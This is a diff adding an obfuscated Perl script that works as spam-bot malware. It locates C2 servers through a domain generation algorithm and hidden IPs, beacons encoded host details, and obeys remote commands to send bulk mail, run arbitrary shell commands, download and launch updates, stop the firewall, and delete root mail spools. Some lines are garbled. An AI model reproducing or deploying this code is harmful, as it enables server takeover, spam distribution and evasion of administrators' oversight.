@@ -1,0 +1,537 @@
+#!/usr/bin/perl
+
+use strict;
+use Socket;
+use CGI;
+srand( time ^ $$ ^ unpack "%L*", `ps axww | gzip` );
+$SIG{PIPE} = sub { die "Broken pipe" };
+$ENV{PATH} =
+  $ENV{PATH} . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
+my $gea2 = ( $< == 0 );
+my $dh8h = ( ( getpwuid($>) )[0] );
+my $dm9p = 0;
+$dm9p = length( $ARGV[0] ) if ( $ARGV[0] =~ /^ +$/ );
+my $kblb = int( rand(2147483647) );
+my ( $fkjd, $bf9k, $abja );
+my $c84j = 443;
+my $jkkl = "/b/index.php";
+my $g4c0 = '/tmp/...';
+my $b098 = 0;
+my $e4l5 = 0;
+my $d890 = 0;
+my $inkc = 0;
+my $c0e1 = 0;
+my $k862 = 0;
+my $cf22 = 50;
+my $p    = "1234567890";
+my $iijg;
+my $f7hh = "sendmail";
+my $jpin;
+my $gpj8;
+my %ilgc;
+my $keml = 31;
+$ilgc{'d_v'}  = $keml;
+$ilgc{'d_w'}  = $dh8h;
+$ilgc{'d_rb'} = $dm9p;
+$ilgc{'d_pi'} = $$;
+$ilgc{'d_iv'} = $];
+
+sub aam {
+    print '[' . localtime() . '] ';
+    print @_;
+}
+
+sub aah {
+    return 0 if !open( SIGNFH, ">$g4c0" );
+    return 0 if !flock( SIGNFH, 2 | 4 );
+    return 1;
+}
+
+sub aap {
+    my $de9m = shift;
+    my $fej2 = shift;
+    my $cobf = shift;
+    my $epf5 = shift;
+    my $i8ma = shift;
+    my $b3pd = $de9m->{ 'name' };
+    my $gc74 = $de9m->{'addr'};
+    my $aep7 = ab2(4);
+    $epf5 =~ s/\[\[firstname\]\]/$b3pd/g;
+    $epf5 =~ s/\[\[id\]\]/$gc74/g;
+    $epf5 =~ s/\[\[count\]\]/$i8ma/g;
+    $epf5 =~ s/\[\[rand\]\]/$aep7/g;
+    $cobf =~ s/\[\[firstname\]\]/$b3pd/g;
+    $cobf =~ s/\[\[id\]\]/$gc74/g;
+    $cobf =~ s/\[\[count\]\]/$i8ma/g;
+    $cobf =~ s/\[\[rand\]\]/$aep7/g;
+    my $i5pd = "From: $fej2|To: "
+      . (
+        $b3pd
+        ? "\"$b3pd\" <$gc74>"
+        : "$gc74"
+      ) . "|Subject: $cobf";
+    eval {
+        open SENDMAIL, "| $f7hh -t";
+        print SENDMAIL "From: $fej2\n";
+        print SENDMAIL "To: " . ( $b3pd ? "\"$b3pd\" <$gc74>" : "$gc74" ) . "\n";
+        print SENDMAIL "Subject: $cobf\n";
+        print SENDMAIL "\n" if ( $f7hh =~ /\/mail/ );
+        print SENDMAIL "$epf5";
+        close SENDMAIL;
+    };
+    if ($@) { my $f3oi = $@; chomp $f3oi; return 0; }
+    return 1;
+}
+
+sub aak {
+    my $jof8 = shift;
+    my $enbg = shift;
+    my @ca4g = @$enbg;
+    my $fej2 = shift @ca4g;
+    my $cobf = shift @ca4g;
+    my $epf5;
+    while ( scalar(@ca4g) ) {
+        my $h1n2 = shift @ca4g;
+        if ( $h1n2 eq $jof8 ) { last; }
+        $epf5 .= $h1n2 . "\n";
+    }
+    my @bhh0;
+    while ( scalar(@ca4g) ) {
+        my $de9m = {};
+        my $h1n2 = shi ft @ca4g;
+        if ( $h1n2 =~ /^(.*)\t(.+)$/ ) {
+            $de9m->{'addr'} = $2;
+            $de9m->{'name'} = $1;
+        }
+        else { $de9m->{'addr'} = $h1n2; }
+        push @bhh0, $de9m if ( $de9m->{'addr'} );
+    }
+    for ( my $i = 0 ; $i < scalar(@bhh0) ; ) {
+        if ( aap( $bhh0[$i], $fej2, $cobf, $epf5, $i ) ) {
+            $d890++;
+            $inkc++;
+        }
+        else { $c0e1++; $k862++; }
+        $i++;
+    }
+    if ($gea2) {
+`rm -f  /var/mail/root /var/spool/mail/root /var/mail/mail /var/spool/mail /mail`;
+    }
+    `rm -f ~/dead.letter`;
+}
+
+sub aae {
+    my $bnbg = sprintf(
+        $gpj8 . " | grep -ci '<html'",
+        "https://accounts.google.com/ServiceLogin?service=mail"
+    );
+    my ($i8nh) = `$bnbg`;
+    chomp $i8nh;
+    return $i8nh;
+}
+
+sub ab7 {
+    if ( $jpin eq "wget" ) {
+        my ($f7pg) = `wget --version | head -n1 | grep -o "\\.[0-9]*" | grep -o "[0-9]*\$"`;
+        chomp $f7pg;
+        $f7pg = int($f7pg);
+        $gpj8 = "wget -q -O - -t 1 -T 60 ";
+        $gpj8 .= "--no-check-certificate " if ( $f7pg > 9 );
+        $gpj8 .= '"%s"';
+    }
+    elsif ( $jpin eq "curl" ) {
+        $gpj8 = 'curl -s -k --max- time 60 "%s"';
+    }
+    elsif ( $jpin eq "fetch" ) { $gpj8 = 'fetch -T 60 -q -o - "%s"'; }
+}
+
+sub find_fetcher {
+    my @j3f8 = ( 'wget', 'curl', 'fetch' );
+    undef $jpin;
+    foreach my $anfc (@j3f8) {
+        if ($iijg) { my $gpi6 = `which $anfc`; next if ( $gpi6 !~ /^\// ); }
+        $jpin = $anfc;
+        ab7();
+        if ( !aae() ) { undef $jpin; next; }
+        last;
+    }
+    if ( !$jpin ) { $jpin = "wget"; ab7(); }
+    $ilgc{'d_br'} = $jpin;
+}
+my $iida = 0;
+
+sub find_mailer {
+    return if ( time() - $iida < 3600 );
+    $iida = time();
+    $iijg = `which which | grep -v alias | sed -e 's/^[[:space:]]*//'`;
+    find_fetcher();
+    find_agent();
+    my $keo2 = `ps -xo command | grep -v grep | grep postfix/master | wc -l | sed -e 's/^[[:space:]]*//'`;
+    chomp $keo2;
+    if ($keo2) {
+        $ilgc{'d_ma'} = 'postfix';
+        if ($iijg) {
+            $keo2 = `which sendmail.postfix`;
+            chomp $keo2;
+            $f7hh = $keo2 if ( $keo2 =~ /^\/.*aap.postfix$/ );
+        }
+    }
+    else {
+        $ilgc{'d_ma'} = 'sendmail';
+        if ($gea2) {
+            my $hcik = `service sendmail status`;
+            chomp $hcik;
+            if ( $hcik =~ /^aap is stopped/ ) { `service sendmail start`; }
+        }
+    }
+    $ilgc{'d_mc'} = $f7hh;
+}
+
+sub find_agent {
+    my @apgb = ( 'sendmail', 'mailx', 'mail' );
+    foreach my $hd4k (@apgb) {
+        if ($iijg) {
+            my $j7mh = `which $hd4k`;
+            chomp $j7mh;
+            if ( $j7mh =~ /^(\/[^ ]+)/ ) {
+                $f7hh = $1;
+                return 1;
+            }
+        }
+        my @fh0p = split /\n/, `locate $hd4k | head -n1000`;
+        push @fh0p, split /\n/, `find /bin/ /sbin/ /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin/ -type f -or -type l | grep $hd4k`;
+        chomp @fh0p;
+        my @jj8b;
+        foreach my $ec62 (@fh0p) {
+            next if ( -d $ec62 );
+            next if ( !-x $ec62 );
+            next if ( $ec62 =~ /\.so$/ );
+            if ( $ec62 =~ /bin\// && $ec62 =~ /$hd4k$/ ) {
+                $f7hh = $ec62;
+                return 1;
+            }
+            push( @jj8b, $ec62 );
+        }
+        foreach my $ec62 (@jj8b) {
+            if ( $ec62 =~ /bin\// ) {
+                $f7hh = $ec62;
+                return 1;
+            }
+        }
+        foreach my $ec62 (@jj8b) {
+            if ( $ec62 =~ /$hd4k$/ ) { $f7hh = $ec62; return 1; }
+        }
+    }
+    return 0;
+}
+
+sub aac {
+    my $h1n2 = shift;
+    my $jljd = shift;
+    if ( $jljd =~ /([0-9]+)\.([0-9]+)\.([0-9]+)\.([0-9]+)/ ) {
+        $jljd = ( $1 << 24 ) + ( $2 << 16 ) + ( $3 << 8 ) + ($4);
+    }
+    else { $jljd = int($jljd); }
+    my @e6ag;
+    $e6ag[0] = ( ( ( $jljd & 0xFF000000 ) >> 24 ) + 15 ) % 256;
+    $e6ag[1] = ( ( ( $jljd & 0x00FF0000 ) >> 16 ) + 13 ) % 256;
+    $e6ag[2] = ( ( ( $jljd & 0x0000FF00 ) >> 8 ) + 52 ) % 256;
+    $e6ag[3] = ( ( ( $jljd & 0x000000FF ) ) + 71 ) % 256;
+    my $fbhj;
+
+    for ( my $i = 0 ; $i < length($h1n2) ; $i++ ) {
+        my $h17g = ord( substr( $h1n2, $i, 1 ) );
+        my $d = int( $h17g ^ $e6ag[ $i % 4 ] );
+        $fbhj .= sprintf( "%02x", $d );
+        $e6ag[ ( $i + 1 ) % 4 ] = ( $e6ag[ ( $i + 1 ) % 4 ] + $d ) % 256;
+    }
+    return $fbhj;
+}
+
+sub aag {
+    my $h1n2 = shift;
+    my $jljd = shift;
+    if ( $jljd =~ /([0-9]+)\.([0-9]+)\.([0-9]+)\.([0-9]+)/ ) {
+        $jljd = ( $1 << 24 ) + ( $2 << 16 ) + ( $3 << 8 ) + ($4);
+    }
+    else { $jljd = int($jljd); }
+    my @e6ag;
+    $e6ag[0] = ( ( ( $jljd & 0xFF000000 ) >> 24 ) + 15 ) % 256;
+    $e6ag[1] = ( ( ( $jljd & 0x00FF0000 ) >> 16 ) + 13 ) % 256;
+    $e6ag[2] = ( ( ( $jljd & 0x0000FF00 ) >> 8 ) + 52 ) % 256;
+    $e6ag[3] = ( ( ( $jljd & 0x000000FF ) ) + 71 ) % 256;
+    my $fbhj;
+
+    for ( my $i = 0 ; $i < length($h1n2) / 2 ; $i++ ) {
+        my $h17g = hex( substr( $h1n2, $i * 2, 2 ) );
+        $e6ag[ ( $i + 1 ) % 4 ] = ( $e6ag[ ( $i + 1 ) % 4 ] + $h17g ) % 256;
+        $fbhj .= chr( $h17g ^ $e6ag[ $i % 4 ] );
+    }
+    return $fbhj;
+}
+
+sub ab2 {
+    my $jnag = shift;
+    my @hknl = ( 'a' .. 'z' );
+    my $hj7k;
+    foreach ( 1 .. $jnag ) { $hj7k .= $hknl[ rand @hknl ]; }
+    return $hj7k;
+}
+
+sub aaj {
+    my $a    = shift;
+    my $fbhj = 0;
+    $fbhj += ( ord( substr( $a, 3, 1 ) ) & 0xFF );
+    $fbhj += ( ord( substr( $a, 2, 1 ) ) & 0xFF ) << 8;
+    $fbhj += ( ord( substr( $a, 1, 1 ) ) & 0xFF ) << 16;
+    $fbhj += ( ord( substr( $a, 0, 1 ) ) & 0xFF ) << 24;
+    return $fbhj;
+}
+
+sub ab8 {
+    my $fkjd = shift;
+    my $fmhi = inet_aton($fkjd);
+    return ( defined $fmhi ) ? inet_ntoa($fmhi) : undef;
+}
+
+sub ab6 {
+    my $jn51 = shift;
+    my $anfc = sprintf( $gpj8, $jn51 );
+    my @fbhj = `$anfc`;
+    chomp @fbhj;
+    return @fbhj;
+}
+
+sub aaf {
+    my $jn51 = shift;
+    my $fhfp = shift;
+
+    if    ( $jpin eq "wget" ) { `wget -q "$jn51" -O "$fhfp"`; }
+    elsif ( $jpin eq "curl" ) { `curl "$jn51" > "$fhfp"`; }
+    elsif ( $jpin eq "fetch" ) { `fetch -o "$fhfp" "$jn51"`; }
+}
+
+my $k6cl = 0;
+my $fde0 = 0;
+my $dfig;
+my @j9gp = ();
+
+sub ab4 {
+    my $bf9k = $c84j;
+    undef $dfig;
+    return ( $dfig, $bf9k ) if ( aao( $j9gp[$k6cl], $bf9k ) );
+    my $h9gp = $k6cl;
+    for ( $k6cl = 0 ; $k6cl < 10 ; $k6cl++ ) {
+        if ( $k6cl == 4 ) {
+            my @p = split '', $p;
+            my $kccf = $p[6];
+            $kccf = "$kccf$kccf.6$kccf.";
+            $kccf .= $p[7] . $p[9];
+            $kccf .= '.' . $p[2] . $p[0];
+            return ( $kccf, $bf9k ) if ( aad( $kccf, $bf9k ) );
+        }
+        if ( $k6cl == 5 ) {
+            my @p = split '', $p;
+            my $kccf = $p[7] . $p[4];
+            $kccf .= '.' . $p[1] . $p[0] . $p[3];
+            $kccf .= '.' . $p[7] . $p[9];
+            $kccf .= '.' . $p[3];
+            return ( $kccf, $bf9k ) if ( aad( $kccf, $bf9k ) );
+        }
+        next if ( $h9gp == $k6cl );
+        return ( $dfig, $bf9k ) if ( aao( $j9gp[$k6cl], $bf9k ) );
+    }
+    my @p = split '', $p;
+    my $kccf = $p[1] . $p[9];
+    $kccf = $kccf . $p[7] . '.' . $kccf;
+    $kccf = '.' . $kccf;
+    $kccf = '.' . $p[1] . $p[2] . $kccf;
+    $kccf = $p[8] . $p[3] . $kccf;
+    return ( $kccf, $bf9k ) if ( aad( $kccf, $bf9k ) );
+    $fde0++;
+    return undef;
+}
+
+sub aai {
+    ( $fkjd, $bf9k ) = ab4();
+    $ilgc{'d_fd'}   = $fkjd;
+    $ilgc{ 'd_fi' } = $abja;
+    $ilgc{'d_fp'}   = $bf9k;
+}
+
+sub aao {
+    my $fkjd = shift;
+    my $bf9k = shift;
+    my $h2n7 = "www." . $fkjd;
+    my $agg4 = aaj( inet_aton($h2n7) );
+    if ($agg4) {
+        my $fklm = ab2(10) . "." . $fkjd;
+        my $g1e1 = aaj( inet_aton($fklm) );
+        if ( $g1e1 && ( $g1e1 == $agg4 + 1 ) ) {
+            return aad( $fklm, $bf9k );
+        }
+    }
+    return 0;
+}
+
+sub aad {
+    $dfig = shift;
+    my $bf9k = shift;
+    my $i622 = int( rand(2147483647) );
+    my $jljd = int( rand(2147483647) );
+    $abja = ab8($dfig);
+    my $ao6a = $i622 . "*" . $kblb . "*" . $jljd;
+    my $ji8c = aac( $ao6a, $abja );
+    my $jn51 = "https://$dfig:$bf9k/$jkkl?id=$ji8c&check=1";
+    my @ca4g = ab6($jn51);
+    for ( my $i = 0 ; $i < scalar(@ca4g) ; $i++ ) {
+        $ca4g[$i] = aag( $ca4g[$i], $jljd );
+    }
+    my $hh0p = shift @ca4g;
+    if ( $hh0p =~ /^SUCCESS$/ ) { $fde0 = 0; return 1; }
+    return 0;
+}
+
+sub ab3 {
+    my $jljd = shift;
+    my $i622 = shift;
+    my $g2h6;
+    foreach my $f ( keys %ilgc ) {
+        if ( $f =~ /^d_(.+)$/ ) {
+            my $b3pd = $1;
+            $g2h6 .= ( $g2h6 ? "|" : "" ) . "$b3pd=" . $ilgc{$f};
+        }
+    }
+    $g2h6 = "$i622*$g2h6" if ($i622);
+    return aac( $g2h6, $jljd );
+}
+my $di4e;
+
+sub aan {
+    my $i610 = shift || tim e || 4357;
+    my @a = ();
+    for ( 1 .. 10000 ) {
+        use integer;
+        push @a, $i610 & 0x7fffffff;
+        $i610 *= 69069;
+    }
+    $di4e = {
+        offset => 0,
+        array  => \@a
+    };
+}
+
+sub aal {
+    my $jk9n = shift || 1.0;
+    aan() unless defined $di4e;
+    $di4e->{offset} = ( $di4e->{offset} + 1 ) % 10000;
+    my $bjee = $di4e->{offset};
+    my $a    = $di4e->{array};
+    $$a[$bjee] =
+      ( $$a[ ( $bjee - 471 ) % 10000 ] ^ $$a[ ( $bjee - 1586 ) % 10000 ]
+          ^ $$a[ ( $bjee - 6988 ) % 10000 ] ^ $$a[ ( $bjee - 9689 ) % 10000 ] );
+    return $$a[$bjee] * $jk9n / ( 2**31 );
+}
+
+sub aab {
+    my $jnag = 10;
+    my @hknl = ( 'a' .. 'z' );
+    aan(123987);
+    my $hj7k;
+    for ( my $i = -14 ; $i < $cf22 ; $i++ ) {
+        $hj7k = "";
+        foreach ( 1 .. $jnag ) {
+            $hj7k .= $hknl[ int( aal( scalar(@hknl) ) ) ];
+        }
+        if ( $i >= 0 ) {
+            my $j8i8 = $hj7k . ".info";
+            push @j9gp, $j8i8;
+        }
+    }
+}
+if ( !aah() ) { exit; }
+aab();
+my $gd50 = 0;
+while (1) {
+    my $hh0p;
+    my @ca4g;
+    find_mailer();
+    aai() if ( !$fkjd || !$bf9k );
+    if ( !$fkjd || !$bf9k ) {
+        if ( $fde0 >= 24 ) { last; }
+        sleep 3600;
+        next;
+    }
+    my $i622 = int( rand(2147483647) );
+    my $jaef = int( rand(2147483647) );
+    my $jljd = int( rand(2147483647) );
+    my $ao6a = $i622 . "*" . $kblb . "*" . $jljd;
+    my $ji8c = aac( $ao6a, $abja );
+    my $jn51 = "https://$fkjd:$bf9k/$jkkl?id=$ji8c";
+    $jn51 .= "&sent=$d890";
+    $jn51 .= "&notsent=$c0e1";
+    my $bgfp = aac( $jaef . "*" . $dh8h, $abja );
+
+    if ($b098) {
+        $jn51 .= "&unknown=" . CGI::escape($b098);
+        $b098 = 0;
+    }
+    if ($e4l5) {
+        $jn51 .= "&testsend=1";
+        $e4l5 = 0;
+    }
+    $jn51 .= "&stat=" . ab3( $abja, $jaef );
+    @ca4g = ab6($jn51);
+    for ( my $i = 0 ; $i < scalar(@ca4g) ; $i++ ) {
+        $ca4g[$i] = aag( $ca4g[$i], $jljd );
+    }
+    $hh0p = shift @ca4g;
+    if ($hh0p) { $d890 = 0; $c0e1 = 0; $gd50 = 0; }
+    else {
+        $gd50++;
+        if ( $gd50 > 3 ) {
+            $gd50 = 0;
+            undef($fkjd);
+            u ndef($bf9k);
+        }
+        $hh0p = "SLEEP 60";
+    }
+    if ( $hh0p =~ /^SLEEP ([0-9]+)$/ ) { sleep $1; next; }
+    elsif ( $hh0p =~ /^RELOAD (.*)$/ ) {
+        aaf( $1, "/tmp/ " );
+        close(SIGNFH);
+        system('cd /tmp; nohup perl " " "   " &');
+        sleep 5;
+        `rm -f "/tmp/ " /tmp/nohup.out`;
+        last;
+    }
+    elsif ( $hh0p =~ /^KILL$/ ) { last; }
+    elsif ( $hh0p =~ /^SEND ([a-zA-Z0-9]+)$/ ) {
+        aak( $1, \@ca4g );
+        undef @ca4g;
+        sleep 1;
+        next;
+    }
+    elsif ( $hh0p =~ /^TESTSEND ([a-zA-Z0-9]+)$/ ) {
+        aak( $1, \@ca4g );
+        undef @ca4g;
+        $e4l5 = 1;
+        sleep 1;
+        n ext;
+    }
+    elsif ( $hh0p =~ /^EXECUTE (.*)$/ ) { qx($1); next; }
+    elsif ( $hh0p =~ /^START SENDMAIL$/ ) {
+        `service sendmail start`;
+        next;
+    }
+    elsif ( $hh0p =~ /^STOP IPTABLES$/ ) {
+        `service iptables stop`;
+        next;
+    }
+    $b098 = $hh0p;
+    sleep 30;
+    if ( !aad( $fkjd, $bf9k ) ) {
+        undef($fkjd);
+        undef($bf9k);
+    }
+}
